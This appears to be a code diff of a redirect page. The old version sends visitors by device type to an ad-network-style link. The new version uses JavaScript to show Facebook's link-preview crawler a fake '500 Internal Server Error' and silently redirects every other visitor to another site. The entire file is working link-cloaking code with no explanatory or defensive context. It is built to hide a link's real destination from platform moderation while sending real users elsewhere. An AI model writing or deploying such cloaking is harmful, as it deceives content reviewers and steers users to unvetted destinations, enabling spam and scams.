@@ -1,26 +1,31 @@
-
-<html>
-    <head>
-<title>Redi</title>
-    </head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Access Control</title>
+    <script>
+        window.onload = function() {
+            // Check the user agent
+            const userAgent = navigator.userAgent;
+            // Simulate checking for Facebook's crawler
+            if (userAgent.includes('facebookexternalhit')) {
+                // Simulate sending a 500 error response
+                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
+                return; // Stop further execution
+            }
+            // Otherwise, redirect to a random page
+            const pages = [
+                "https://kello.me",
+                "https://kello.me",
+                "https://kello.me",
+                "https://kello.me"
+            ];
+            const randomPage = pages[Math.floor(Math.random() * pages.length)];
+            window.location.href = randomPage;
+        };
+    </script>
+</head>
 <body>
-
-    <?php
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-
-if(strpos($userAgent, 'iPhone') !== false || strpos($userAgent, 'iPad') !== false || strpos($userAgent, 'iPod') !== false) {
-    // iOS users will go through the normal link
-    header('Location: https://coherentchuckled.com/fv387ni6vk?key=4a013961dae2e11c3e9ff3fe31bf495a');
-} 
-else if(strpos($userAgent, 'Android') !== false) {
-    // Android users will use the deep link
-    header("Location: intent://coherentchuckled.com/fv387ni6vk?key=4a013961dae2e11c3e9ff3fe31bf495a#Intent;scheme=https;package=com.android.chrome;end;");
-} 
-else {
-    // Other users will go through the normal link
-    header('Location: https://coherentchuckled.com/fv387ni6vk?key=4a013961dae2e11c3e9ff3fe31bf495a');
-}
-exit();
-?>
 </body>
 </html>
